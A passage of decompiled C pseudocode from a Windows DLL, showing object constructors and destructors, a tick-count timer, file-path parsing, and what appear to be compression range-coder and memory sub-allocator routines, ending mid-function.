        v3 = v5 + v2 + 1;
      }
      else
      {
        v5 = v2;
        v3 = v2 + v6;
      }
      v2 = v3 / 2;
    }
    while ( v3 / 2 > v6 );
  }
  if ( v2 == v6 )
    return v6 + 1;
  return v2;
}

//----- (10030D81) --------------------------------------------------------
void __usercall sub_10030D81(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10030DA9) --------------------------------------------------------
_DWORD *__stdcall sub_10030DA9(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10072944;
  *a1 = &off_10074D04;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 10074D04: using guessed type int (__thiscall *off_10074D04)(void *Block, char);

//----- (10030DD4) --------------------------------------------------------
_DWORD *__stdcall sub_10030DD4(_DWORD *a1)
{
  int v1; // eax

  sub_10011C8D(a1);
  *a1 = &off_10073638;
  v1 = sub_100118F1(1u, 0x10u);
  sub_10011CF2(v1, a1);
  return a1;
}
// 10073638: using guessed type int (__thiscall *off_10073638)(void *Block, char);

//----- (10030E11) --------------------------------------------------------
DWORD *__userpurge sub_10030E11@<eax>(DWORD *a1@<esi>, DWORD a2)
{
  *a1 = GetTickCount();
  a1[1] = a2;
  return a1;
}

//----- (10030E28) --------------------------------------------------------
int __usercall sub_10030E28@<eax>(_DWORD *a1@<esi>)
{
  int result; // eax
  DWORD v2; // ecx
  DWORD v3; // eax

  result = -1;
  if ( a1[1] != -1 )
  {
    v2 = GetTickCount() - *a1;
    v3 = a1[1];
    if ( v2 <= v3 )
      return v3 - v2;
    else
      return 0;
  }
  return result;
}

//----- (10030E49) --------------------------------------------------------
bool __usercall sub_10030E49@<al>(_DWORD *a1@<eax>)
{
  return a1[1] != -1 && sub_10030E28(a1) == 0;
}

//----- (10030E74) --------------------------------------------------------
_DWORD *__thiscall sub_10030E74(void *this, _DWORD *a2, int a3, int a4)
{
  a2[2] = 0;
  a2[3] = 0;
  *a2 = &off_10074DAC;
  a2[1] = this;
  sub_10009F32(a2 + 4, (int)&a3);
  sub_10009F65(&a3);
  return a2;
}
// 10074DAC: using guessed type int (__thiscall *off_10074DAC)(void *Block, char);

//----- (10030EBA) --------------------------------------------------------
int *__thiscall sub_10030EBA(int *Block, char a2)
{
  sub_10030ED9(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10030ED9) --------------------------------------------------------
void __thiscall sub_10030ED9(int *this)
{
  *this = (int)&off_10074DAC;
  sub_10009F65(this + 4);
}
// 10074DAC: using guessed type int (__thiscall *off_10074DAC)(void *Block, char);

//----- (10030F17) --------------------------------------------------------
_DWORD *__stdcall sub_10030F17(int a1, _DWORD *a2)
{
  sub_10009F32(a2, a1 + 16);
  return a2;
}

//----- (10030F50) --------------------------------------------------------
_DWORD *__thiscall sub_10030F50(
        void *this,
        _DWORD *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int *a8,
        int *a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15)
{
  int v15; // ecx
  int v16; // eax
  int v18; // [esp-1Ch] [ebp-38h] BYREF
  int v19; // [esp-18h] [ebp-34h]
  int v20; // [esp-14h] [ebp-30h] BYREF
  int v21; // [esp-10h] [ebp-2Ch]
  int v22; // [esp-Ch] [ebp-28h]
  int *v23; // [esp-8h] [ebp-24h]
  int *v24; // [esp-4h] [ebp-20h]
  int v25; // [esp+18h] [ebp-4h]

  v25 = 1;
  v24 = a9;
  v23 = a8;
  v22 = a7;
  v21 = (int)this;
  v20 = (int)this;
  a9 = &v20;
  sub_10009F32(&v20, (int)&a5);
  LOBYTE(v25) = 2;
  v19 = v15;
  v18 = v15;
  a8 = &v18;
  sub_10009F32(&v18, (int)&a3);
  LOBYTE(v25) = 1;
  sub_1003408D((int)a2, v18, v19, v20, v21, v22, (int)v23, (char)v24);
  a2[8] = a10;
  a2[9] = a11;
  a2[10] = a12;
  a2[11] = a13;
  a2[12] = a14;
  v16 = a15;
  *a2 = &off_10074DB4;
  a2[13] = v16;
  LOBYTE(v25) = 0;
  sub_10009F65(&a3);
  v25 = -1;
  sub_10009F65(&a5);
  return a2;
}
// 10030F84: variable 'v15' is possibly undefined
// 10074DB4: using guessed type int (__thiscall *off_10074DB4)(void *Block, char);

//----- (10030FF3) --------------------------------------------------------
int *__thiscall sub_10030FF3(int *Block, char a2)
{
  sub_10031012(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10031012) --------------------------------------------------------
void __thiscall sub_10031012(int *this)
{
  *this = (int)&off_10074DB4;
  sub_10034128(this);
}
// 10074DB4: using guessed type int (__thiscall *off_10074DB4)(void *Block, char);

//----- (10031036) --------------------------------------------------------
_DWORD *__thiscall sub_10031036(_DWORD *this, _DWORD *a2)
{
  int v2; // edx
  _DWORD *result; // eax
  int v4; // ecx

  v2 = this[8];
  result = a2;
  v4 = this[9];
  *a2 = v2;
  a2[1] = v4;
  return result;
}

//----- (1003104B) --------------------------------------------------------
_DWORD *__thiscall sub_1003104B(_DWORD *this, _DWORD *a2)
{
  int v2; // edx
  _DWORD *result; // eax
  int v4; // ecx

  v2 = this[10];
  result = a2;
  v4 = this[11];
  *a2 = v2;
  a2[1] = v4;
  return result;
}

//----- (10031060) --------------------------------------------------------
_DWORD *__thiscall sub_10031060(_DWORD *this, _DWORD *a2)
{
  int v2; // edx
  _DWORD *result; // eax
  int v4; // ecx

  v2 = this[12];
  result = a2;
  v4 = this[13];
  *a2 = v2;
  a2[1] = v4;
  return result;
}

//----- (10031075) --------------------------------------------------------
_DWORD *__stdcall sub_10031075(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_10074DD8;
  return a1;
}
// 10074DD8: using guessed type int (__thiscall *off_10074DD8)(void *Block, char);

//----- (100310A3) --------------------------------------------------------
_DWORD *__thiscall sub_100310A3(_DWORD *Block, char a2)
{
  sub_100310C2(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100310C2) --------------------------------------------------------
void __thiscall sub_100310C2(_DWORD *this)
{
  *this = &off_10074DD8;
  sub_1000DF1A(this);
}
// 10074DD8: using guessed type int (__thiscall *off_10074DD8)(void *Block, char);

//----- (100310E6) --------------------------------------------------------
_DWORD *__stdcall sub_100310E6(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_10074DE0;
  return a1;
}
// 10074DE0: using guessed type int (__thiscall *off_10074DE0)(void *Block, char);

//----- (10031114) --------------------------------------------------------
_DWORD *__thiscall sub_10031114(_DWORD *Block, char a2)
{
  sub_10031133(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10031133) --------------------------------------------------------
void __thiscall sub_10031133(_DWORD *this)
{
  *this = &off_10074DE0;
  sub_1000DF1A(this);
}
// 10074DE0: using guessed type int (__thiscall *off_10074DE0)(void *Block, char);

//----- (10031157) --------------------------------------------------------
_DWORD *__stdcall sub_10031157(_DWORD *a1)
{
  _DWORD *result; // eax
  int v2; // ecx

  result = a1;
  v2 = a1[1];
  *a1 = &off_10074AE0;
  *(_DWORD *)((char *)a1 + *(_DWORD *)(v2 + 4) + 4) = &off_10074AE4;
  return result;
}
// 10074AE0: using guessed type void (__noreturn *off_10074AE0)();
// 10074AE4: using guessed type int (__stdcall *off_10074AE4)(char);

//----- (1003117A) --------------------------------------------------------
int __thiscall sub_1003117A(_DWORD *this)
{
  int v1; // eax
  int result; // eax

  v1 = *(this - 1);
  *(this - 2) = &off_10074AE0;
  result = *(_DWORD *)(v1 + 4);
  *(_DWORD *)((char *)this + result - 4) = &off_10074AE4;
  return result;
}
// 10074AE0: using guessed type void (__noreturn *off_10074AE0)();
// 10074AE4: using guessed type int (__stdcall *off_10074AE4)(char);

//----- (10031190) --------------------------------------------------------
_DWORD *__stdcall sub_10031190(_DWORD *a1)
{
  int v1; // eax

  a1[1] = &unk_10074B00;
  a1[2] = &unk_10074B08;
  sub_1000DEEF(a1 + 4);
  sub_10031157(a1);
  sub_1000E2E3(a1 + 2, 0);
  v1 = a1[1];
  *a1 = &off_10074AF4;
  *(_DWORD *)((char *)a1 + *(_DWORD *)(v1 + 4) + 4) = &off_10074AF8;
  return a1;
}
// 10074AF4: using guessed type int (*off_10074AF4)();
// 10074AF8: using guessed type int (__stdcall *off_10074AF8)(char);

//----- (100311FD) --------------------------------------------------------
int __thiscall sub_100311FD(_DWORD *this)
{
  int v2; // ecx
  _DWORD *v3; // ecx
  int v4; // eax

  v2 = *(this - 3);
  *(this - 4) = &off_10074AF4;
  *(_DWORD *)((char *)this + *(_DWORD *)(v2 + 4) - 12) = &off_10074AF8;
  v3 = this - 2;
  v4 = this != (_DWORD *)16 ? (unsigned int)(this - 2) : 0;
  *(_DWORD *)(*(_DWORD *)(*(_DWORD *)v4 + 4) + v4) = &off_100731F0;
  return sub_1003117A(v3);
}
// 100731F0: using guessed type int (__stdcall *off_100731F0)(char);
// 10074AF4: using guessed type int (*off_10074AF4)();
// 10074AF8: using guessed type int (__stdcall *off_10074AF8)(char);

//----- (10031252) --------------------------------------------------------
int __thiscall sub_10031252(_DWORD *this)
{
  return this[3];
}

//----- (10031256) --------------------------------------------------------
void __fastcall sub_10031256(_DWORD *a1, int a2)
{
  int v3; // esi
  _DWORD *v5; // eax
  unsigned int v6; // ebx
  _DWORD *v7; // eax
  int v8; // esi
  _DWORD *v9; // eax
  int v10; // esi
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  int *v13; // esi
  wint_t *v14; // eax
  wint_t v15; // ax
  int v16; // ecx
  _DWORD *v17; // eax
  int *v18; // esi
  int v19; // eax
  LPWSTR FilePart; // [esp+10h] [ebp-24Ch] BYREF
  int *v21; // [esp+14h] [ebp-248h]
  _DWORD *v22; // [esp+18h] [ebp-244h]
  _DWORD *v23; // [esp+1Ch] [ebp-240h]
  _DWORD *v24; // [esp+20h] [ebp-23Ch]
  int pExceptionObject; // [esp+24h] [ebp-238h] BYREF
  int v26[2]; // [esp+28h] [ebp-234h] BYREF
  _DWORD *v27; // [esp+30h] [ebp-22Ch]
  int *v28; // [esp+34h] [ebp-228h]
  _DWORD *v29; // [esp+38h] [ebp-224h]
  int v30; // [esp+3Ch] [ebp-220h] BYREF
  int v31; // [esp+40h] [ebp-21Ch] BYREF
  WCHAR Buffer[266]; // [esp+44h] [ebp-218h] BYREF
  int v33; // [esp+258h] [ebp-4h]

  v3 = (int)(a1 + 1);
  v29 = a1;
  *a1 = &off_10074DE8;
  v28 = a1 + 1;
  sub_1000B9A0(a1 + 1, &word_1008E1BC);
  v33 = 5;
  v23 = a1 + 3;
  sub_1000B9A0(a1 + 3, &word_1008E1C0);
  v24 = a1 + 5;
  sub_1000B9A0(a1 + 5, &word_1008E1C4);
  v27 = a1 + 7;
  sub_1000B9A0(a1 + 7, &word_1008E1C8);
  v22 = a1 + 9;
  sub_1000B9A0(a1 + 9, &word_1008E1CC);
  v21 = a1 + 12;
  sub_1000B9A0(a1 + 12, &word_1008E1D0);
  if ( !GetFullPathNameW(*(LPCWSTR *)(*(_DWORD *)(a2 + 4) + 12), 0x104u, Buffer, &FilePart) )
  {
    sub_1000E2E3(&pExceptionObject, 1);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v5 = sub_1000B9A0(&v30, Buffer);
  LOBYTE(v33) = 6;
  sub_100021B1(v5 + 1, (int *)(v3 + 4));
  LOBYTE(v33) = 5;
  sub_1000BA51(&v30);
  v6 = sub_1000A996(v3, 0x5Cu) + 1;
  v7 = sub_1000A3E9((int)v28, v6, v26, 0xFFFFFFFE);
  LOBYTE(v33) = 7;
  sub_1000BA21(&v30, (int)v7);
  LOBYTE(v33) = 8;
  v8 = (int)v27;
  sub_100021B1(&v31, v27 + 1);
  LOBYTE(v33) = 7;
  sub_1000BA51(&v30);
  LOBYTE(v33) = 5;
  sub_10009F65(v26);
  v9 = sub_1000A3E9((int)v28, 0, v26, v6);
  LOBYTE(v33) = 9;
  sub_1000BA21(&v30, (int)v9);
  LOBYTE(v33) = 10;
  sub_100021B1(&v31, v22 + 1);
  LOBYTE(v33) = 9;
  sub_1000BA51(&v30);
  LOBYTE(v33) = 5;
  sub_10009F65(v26);
  v10 = sub_1000A996(v8, 0x2Eu);
  if ( v10 == -1 )
    v10 = *(_DWORD *)(v29[8] + 28);
  v11 = sub_1000A3E9((int)v27, 0, v26, v10);
  LOBYTE(v33) = 11;
  sub_1000BA21(&v30, (int)v11);
  LOBYTE(v33) = 12;
  sub_100021B1(&v31, v23 + 1);
  LOBYTE(v33) = 11;
  sub_1000BA51(&v30);
  LOBYTE(v33) = 5;
  sub_10009F65(v26);
  v12 = sub_1000A3E9((int)v27, v10 + 1, v26, 0xFFFFFFFE);
  LOBYTE(v33) = 13;
  sub_1000BA21(&v30, (int)v12);
  LOBYTE(v33) = 14;
  sub_100021B1(&v31, v24 + 1);
  LOBYTE(v33) = 13;
  sub_1000BA51(&v30);
  LOBYTE(v33) = 5;
  sub_10009F65(v26);
  v13 = v28;
  if ( *(_WORD *)sub_1000A0AA(v28, 1) == 58 )
  {
    v14 = (wint_t *)sub_1000A0AA(v13, 0);
    v15 = sub_1003A1CE(*v14);
    v16 = (int)v29;
    *((_WORD *)v29 + 23) = v15;
    *(_BYTE *)(v16 + 44) = 1;
  }
  else
  {
    v17 = sub_1000A3E9((int)v13, 2u, v26, 0xFFFFFFFE);
    LOBYTE(v33) = 15;
    sub_1000BA21(&v30, (int)v17);
    LOBYTE(v33) = 16;
    v18 = v21;
    sub_100021B1(&v31, v21 + 1);
    LOBYTE(v33) = 15;
    sub_1000BA51(&v30);
    LOBYTE(v33) = 5;
    sub_10009F65(v26);
    v19 = sub_1000A974(0, (int)v18, 0x5Cu);
    sub_1000A8F8(v19, v18);
    *((_BYTE *)v29 + 44) = 0;
  }
  v33 = -1;
  sub_10056753();
}
// 10074DE8: using guessed type int (__thiscall *off_10074DE8)(void *Block, char);

//----- (100315C3) --------------------------------------------------------
int *__thiscall sub_100315C3(int *Block, char a2)
{
  sub_100315E2(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100315E2) --------------------------------------------------------
void __thiscall sub_100315E2(int *this)
{
  *this = (int)&off_10074DE8;
  sub_1000BA51(this + 12);
  sub_1000BA51(this + 9);
  sub_1000BA51(this + 7);
  sub_1000BA51(this + 5);
  sub_1000BA51(this + 3);
  sub_1000BA51(this + 1);
}
// 10074DE8: using guessed type int (__thiscall *off_10074DE8)(void *Block, char);

//----- (1003164A) --------------------------------------------------------
_DWORD *__stdcall sub_1003164A(int a1, _DWORD *a2)
{
  sub_10009F32(a2, a1 + 4);
  return a2;
}

//----- (1003167F) --------------------------------------------------------
_DWORD *__stdcall sub_1003167F(int a1, _DWORD *a2)
{
  sub_10009F32(a2, a1 + 28);
  return a2;
}

//----- (100316B4) --------------------------------------------------------
_DWORD *__stdcall sub_100316B4(int a1, _DWORD *a2)
{
  sub_10009F32(a2, a1 + 12);
  return a2;
}

//----- (100316E9) --------------------------------------------------------
_DWORD *__stdcall sub_100316E9(int a1, _DWORD *a2)
{
  sub_10009F32(a2, a1 + 20);
  return a2;
}

//----- (1003171E) --------------------------------------------------------
_DWORD *__stdcall sub_1003171E(int a1, _DWORD *a2)
{
  sub_10009F32(a2, a1 + 36);
  return a2;
}

//----- (1003177D) --------------------------------------------------------
_DWORD *__stdcall sub_1003177D(int pExceptionObject, _DWORD *a2)
{
  if ( *(_BYTE *)(pExceptionObject + 44) )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_10009F32(a2, pExceptionObject + 48);
  return a2;
}

//----- (100317CE) --------------------------------------------------------
int __fastcall sub_100317CE(_DWORD *a1)
{
  int v1; // eax
  _DWORD *v3; // [esp-2h] [ebp-4h] BYREF

  v3 = a1;
  v1 = *a1;
  HIBYTE(v3) = 0;
  if ( (*(int (__thiscall **)(_DWORD *, char *, _DWORD *))(v1 + 16))(a1, (char *)&v3 + 3, v3) )
    return HIBYTE(v3);
  else
    return -1;
}

//----- (100317EE) --------------------------------------------------------
int __thiscall sub_100317EE(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[8] + 16))(this + 8, a2);
  return a2;
}

//----- (10031812) --------------------------------------------------------
unsigned int sub_10031812()
{
  unsigned int result; // eax

  result = dword_10093394 / (unsigned int)dword_100933A4;
  unk_10094F64 += dword_1009339C * (dword_10093394 / (unsigned int)dword_100933A4);
  dword_10093394 = dword_10093394 / (unsigned int)dword_100933A4 * (dword_100933A0 - dword_1009339C);
  return result;
}
// 10093394: using guessed type int dword_10093394;
// 1009339C: using guessed type int dword_1009339C;
// 100933A0: using guessed type int dword_100933A0;
// 100933A4: using guessed type int dword_100933A4;

//----- (10031842) --------------------------------------------------------
unsigned int sub_10031842()
{
  unsigned int result; // eax

  result = (unsigned int)dword_10093394 >> 14;
  unk_10094F64 += dword_1009339C * ((unsigned int)dword_10093394 >> 14);
  dword_10093394 = ((unsigned int)dword_10093394 >> 14) * (dword_100933A0 - dword_1009339C);
  return result;
}
// 10093394: using guessed type int dword_10093394;
// 1009339C: using guessed type int dword_1009339C;
// 100933A0: using guessed type int dword_100933A0;

//----- (1003186D) --------------------------------------------------------
unsigned int sub_1003186D()
{
  dword_10093394 /= (unsigned int)dword_100933A4;
  return (dword_100933A8 - unk_10094F64) / (unsigned int)dword_10093394;
}
// 10093394: using guessed type int dword_10093394;
// 100933A4: using guessed type int dword_100933A4;
// 100933A8: using guessed type int dword_100933A8;

//----- (10031892) --------------------------------------------------------
unsigned int sub_10031892()
{
  dword_10093394 = (unsigned int)dword_10093394 >> 14;
  return (dword_100933A8 - unk_10094F64) / (unsigned int)dword_10093394;
}
// 10093394: using guessed type int dword_10093394;
// 100933A8: using guessed type int dword_100933A8;

//----- (100318AD) --------------------------------------------------------
int sub_100318AD()
{
  int result; // eax

  result = dword_1009339C;
  unk_10094F64 += dword_10093394 * dword_1009339C;
  dword_10093394 *= dword_100933A0 - dword_1009339C;
  return result;
}
// 10093394: using guessed type int dword_10093394;
// 1009339C: using guessed type int dword_1009339C;
// 100933A0: using guessed type int dword_100933A0;

//----- (10031908) --------------------------------------------------------
int *sub_10031908()
{
  int *result; // eax
  int i; // ecx

  result = &dword_10095640;
  for ( i = 37; i >= 0; --i )
  {
    *result = 0;
    result[1] = 0;
    result += 2;
  }
  return result;
}
// 10095640: using guessed type int dword_10095640;

//----- (1003194B) --------------------------------------------------------
_DWORD *__usercall sub_1003194B@<eax>(int a1@<eax>, int a2@<ecx>, int a3)
{
  int v3; // eax
  int v4; // ecx
  int v5; // edx
  _DWORD *result; // eax
  int v7; // esi
  int *v8; // edx
  int *v9; // edx

  v3 = (unsigned __int8)byte_10094F68[a1];
  v4 = (unsigned __int8)byte_10094F68[a2] - v3;
  v5 = (unsigned __int8)byte_10094F97[v4];
  result = (_DWORD *)(a3 + 12 * v3);
  if ( (unsigned __int8)byte_10094F68[v5] != v4 )
  {
    v7 = (unsigned __int8)byte_10094F67[v5];
    v8 = &dword_10095640[2 * v5 - 2];
    result[1] = v8[1];
    v8[1] = (int)result;
    *result = -1;
    result[2] = v7;
    ++*v8;
    result += 3 * v7;
    v4 -= v7;
  }
  v9 = &dword_10095640[2 * (unsigned __int8)byte_10094F97[v4]];
  result[1] = v9[1];
  v9[1] = (int)result;
  *result = -1;
  result[2] = v4;
  ++*v9;
  return result;
}
// 10095640: using guessed type int dword_10095640[];

//----- (100319C4) --------------------------------------------------------
int sub_100319C4()
{
  int result; // eax
  unsigned int i; // ecx

  result = dword_1008E11C + dword_10094148 + dword_100933AC - dword_10094F60 - dword_100933BC;
  for ( i = 0; i < 0x26; ++i )
    result += -12 * dword_10095640[2 * i] * (unsigned __int8)byte_10094F68[i];
  return result;
}
// 1008E11C: using guessed type int dword_1008E11C;
// 100933AC: using guessed type int dword_100933AC;
// 100933BC: using guessed type int dword_100933BC;
// 10094148: using guessed type int dword_10094148;
// 10094F60: using guessed type int dword_10094F60;
// 10095640: using guessed type int dword_10095640[];

//----- (100319FE) --------------------------------------------------------
void sub_100319FE()
{
  if ( dword_1008E11C )
  {
    dword_1008E11C = 0;
    j__free(Block);
  }
}
// 1008E11C: using guessed type int dword_1008E11C;

//----- (10031A1B) --------------------------------------------------------
int __usercall sub_10031A1B@<eax>(size_t a1@<esi>)
{
  int result; // eax

  sub_100319FE();
  result = (int)operator new(a1);
  Block = (void *)result;
  if ( result )
  {
    dword_1008E11C = a1;
    return 1;
  }
  return result;
}
// 1008E11C: using guessed type int dword_1008E11C;

//----- (10031A3B) --------------------------------------------------------
unsigned int sub_10031A3B()
{
  unsigned int result; // eax

  memset(dword_10095640, 0, 0x130u);
  dword_100933AC = (int)Block;
  dword_100933B8 = 0;
  dword_100933BC = (int)Block + dword_1008E11C;
  result = 84 * (((unsigned int)dword_1008E11C >> 3) / 0xC);
  dword_10094F60 = (int)Block + dword_1008E11C - result;
  dword_10094148 = (int)Block + dword_1008E11C - result;
  return result;
}
// 1008E11C: using guessed type int dword_1008E11C;
// 100933AC: using guessed type int dword_100933AC;
// 100933B8: using guessed type int dword_100933B8;
// 100933BC: using guessed type int dword_100933BC;
// 10094148: using guessed type int dword_10094148;
// 10094F60: using guessed type int dword_10094F60;
// 10095640: using guessed type int dword_10095640[];

//----- (10031A8D) --------------------------------------------------------
unsigned int sub_10031A8D()
{
  unsigned int result; // eax
  int *v1; // esi
  int *v2; // edx
  int v3; // ecx
  int v4; // ecx
  _DWORD *v5; // ecx
  _DWORD *v6; // ecx
  unsigned int v7; // esi
  int v8; // edi
  int v9; // edx
  int v10; // esi
  int v11; // eax
  _DWORD *v12; // edx
  _DWORD *v13; // eax
  int v14; // esi
  int v15; // [esp+Ch] [ebp-10h] BYREF
  _DWORD *v16; // [esp+10h] [ebp-Ch]
  int v17; // [esp+14h] [ebp-8h]
  int v18; // [esp+18h] [ebp-4h]

  result = dword_10094148;
  v15 = 0;
  v17 = 0;
  if ( dword_10094148 != dword_100933BC )
    *(_BYTE *)dword_10094148 = 0;
  v1 = &v15;
  v16 = 0;
  v2 = &dword_10095644;
  v18 = 38;
  do
  {
    while ( *v2 )
    {
      result = *v2;
      v3 = *(_DWORD *)(*v2 + 4);
      --*(v2 - 1);
      *v2 = v3;
      v4 = *(_DWORD *)(result + 8);
      if ( v4 )
      {
        while ( 1 )
        {
          v5 = (_DWORD *)(result + 12 * v4);
          if ( *v5 != -1 )
            break;
          *(_DWORD *)(result + 8) += v5[2];
          v5[2] = 0;
          v4 = *(_DWORD *)(result + 8);
        }
        *(_DWORD *)(result + 4) = v1[1];
        v1[1] = result;
        v1 = (int *)result;
      }
    }
    v2 += 2;
    --v18;
  }
  while ( v18 );
  while ( v16 )
  {
    v6 = v16;
    v16 = (_DWORD *)v16[1];
    result = v6[2];
    if ( result )
    {
      if ( result > 0x80 )
      {
        v7 = ((result - 129) >> 7) + 1;
        do
        {
          v6[1] = dword_1009576C;
          dword_1009576C = (int)v6;
          *v6 = -1;
          v6[2] = 128;
          ++dword_10095768;
          result -= 128;
          v6 += 384;
          --v7;
        }
        while ( v7 );
      }
      v8 = (unsigned __int8)byte_10094F97[result];
      if ( (unsigned __int8)byte_10094F68[v8] != result )
      {
        v9 = (unsigned __int8)byte_10094F67[v8--];
        v10 = result - v9;
        v11 = 3 * v9;
        v12 = (_DWORD *)((char *)&unk_10095638 + 8 * v10);
        v13 = &v6[v11];
        v13[1] = v12[1];
        v12[1] = v13;
        *v13 = -1;
        v13[2] = v10;
        ++*v12;
      }
      v14 = (unsigned __int8)byte_10094F68[v8];
      result = (unsigned int)&dword_10095640[2 * v8];
      v6[1] = *(_DWORD *)(result + 4);
      *(_DWORD *)(result + 4) = v6;
      *v6 = -1;
      v6[2] = v14;
      ++*(_DWORD *)result;
    }
  }
  dword_100933B8 = 0x2000;
  return result;
}
// 100933B8: using guessed type int dword_100933B8;
// 100933BC: using guessed type int dword_100933BC;
// 10094148: using guessed type int dword_10094148;
// 10095640: using guessed type int dword_10095640[];
// 10095644: using guessed type int dword_10095644;
// 10095768: using guessed type int dword_10095768;
// 1009576C: using guessed type int dword_1009576C;

//----- (10031BD2) --------------------------------------------------------
int __usercall sub_10031BD2@<eax>(int a1@<edi>)
{
  int v1; // ebx
  int v2; // eax
  int *v3; // ecx
  int result; // eax
  int v5; // edx
  int *v6; // eax
  int v7; // esi
  int v8; // ecx
  int v9; // eax

  v1 = a1;
  if ( dword_100933B8 || (sub_10031A8D(), v2 = 2 * a1, !dword_10095644[2 * a1]) )
  {
    while ( ++v1 != 38 )
    {
      if ( dword_10095644[2 * v1] )
      {
        v6 = &dword_10095640[2 * v1];
        v7 = v6[1];
        v8 = *(_DWORD *)(v7 + 4);
        --*v6;
        v6[1] = v8;
        sub_1003194B(a1, v1, v7);
        return v7;
      }
    }
    v9 = 12 * (unsigned __int8)byte_10094F68[a1];
    --dword_100933B8;
    if ( dword_10094F60 - dword_100933AC <= v9 )
    {
      return 0;
    }
    else
    {
      dword_10094F60 -= v9;
      return dword_10094F60;
    }
  }
  else
  {
    v3 = &dword_10095640[v2];
    result = dword_10095640[v2 + 1];
    v5 = *(_DWORD *)(result + 4);
    --*v3;
    v3[1] = v5;
  }
  return result;
}
// 100933AC: using guessed type int dword_100933AC;
// 100933B8: using guessed type int dword_100933B8;
// 10094F60: using guessed type int dword_10094F60;
// 10095640: using guessed type int dword_10095640[];
// 10095644: using guessed type int dword_10095644[];

//----- (10031C67) --------------------------------------------------------
int __usercall sub_10031C67@<eax>(int a1@<eax>)
{
  int v1; // edi
  int v2; // eax
  int *v3; // ecx
  int result; // eax
  int v5; // edx
  int v6; // ecx

  v1 = (unsigned __int8)byte_10094F97[a1];
  v2 = 2 * v1;
  if ( dword_10095644[2 * v1] )
  {
    v3 = &dword_10095640[v2];
    result = dword_10095640[v2 + 1];
    v5 = *(_DWORD *)(result + 4);
    --*v3;
    v3[1] = v5;
  }
  else
  {
    v6 = 12 * (unsigned __int8)byte_10094F68[v1];
    result = dword_10094148;
    dword_10094148 += v6;
    if ( dword_10094148 > (unsigned int)dword_100933BC )
    {
      dword_10094148 -= v6;
      return sub_10031BD2(v1);
    }
  }
  return result;
}
// 100933BC: using guessed type int dword_100933BC;
// 10094148: using guessed type int dword_10094148;
// 10095640: using guessed type int dword_10095640[];
// 10095644: using guessed type int dword_10095644[];

//----- (10031CBF) --------------------------------------------------------
int sub_10031CBF()
{
  int result; // eax
  int v1; // ecx

  if ( dword_100933BC == dword_10094148 )
  {
    result = dword_10095644[0];
    if ( dword_10095644[0] )
    {
      v1 = *(_DWORD *)(dword_10095644[0] + 4);
      --dword_10095640[0];
      dword_10095644[0] = v1;
    }
    else
    {
      return sub_10031BD2(0);
    }
  }
  else
  {
    result = dword_100933BC - 12;
    dword_100933BC -= 12;
  }
  return result;
}
// 100933BC: using guessed type int dword_100933BC;
// 10094148: using guessed type int dword_10094148;
// 10095640: using guessed type int dword_10095640[];
// 10095644: using guessed type int dword_10095644[];

//----- (10031CF8) --------------------------------------------------------
_DWORD *__usercall sub_10031CF8@<eax>(int a1@<eax>, _DWORD *a2@<edx>, int a3)
{
  _DWORD *v4; // ecx
  _DWORD *result; // eax
  char *v6; // edx

  v4 = a2;
  result = (_DWORD *)(a1 + 8);
  v6 = (char *)a2 - a1;
  do
  {
    *v4 = *(result - 2);
    v4[1] = *(result - 1);
    *(_DWORD *)((char *)result + (_DWORD)v6) = *result;
    v4 += 3;
    result += 3;
    --a3;
  }
  while ( a3 );
  return result;
}

//----- (10031D23) --------------------------------------------------------
_DWORD *__usercall sub_10031D23@<eax>(int a1@<edi>, _DWORD *a2@<esi>)
{
  int v2; // ebx
  _DWORD *v4; // edx
  int *v5; // eax
  _DWORD *v6; // [esp+4h] [ebp-4h]

  v2 = byte_10094F98[a1 - 1];
  if ( v2 == byte_10094F98[a1] )
    return a2;
  v4 = (_DWORD *)sub_10031C67(a1 + 1);
  v6 = v4;
  if ( v4 )
  {
    sub_10031CF8((int)a2, v4, a1);
    v5 = &dword_10095640[2 * v2];
    a2[1] = v5[1];
    v5[1] = (int)a2;
    *a2 = -1;
    a2[2] = a1;
    ++*v5;
  }
  return v6;
}
// 10094F98: using guessed type unsigned __int8 byte_10094F98[128];
// 10095640: using guessed type int dword_10095640[];

//----- (10031D75) --------------------------------------------------------
_DWORD *__usercall sub_10031D75@<eax>(int a1@<eax>, int a2@<edx>, _DWORD *a3@<esi>)
{
  int v3; // edi
  int v4; // eax
  int v5; // ecx
  int *v6; // eax
  _DWORD *v7; // ebx
  int v8; // ecx
  int *v9; // eax
  int v10; // ecx

  v3 = (unsigned __int8)byte_10094F97[a1];
  v4 = (unsigned __int8)byte_10094F97[a2];
  if ( v3 != v4 )
  {
    v5 = 2 * v4;
    if ( dword_10095644[2 * v4] )
    {
      v6 = &dword_10095640[v5];
      v7 = (_DWORD *)dword_10095640[v5 + 1];
      v8 = v7[1];
      --*v6;
      v6[1] = v8;
      sub_10031CF8((int)a3, v7, a2);
      v9 = &dword_10095640[2 * v3];
      v10 = (unsigned __int8)byte_10094F68[v3];
      a3[1] = v9[1];
      v9[1] = (int)a3;
      *a3 = -1;
      a3[2] = v10;
      ++*v9;
      return v7;
    }
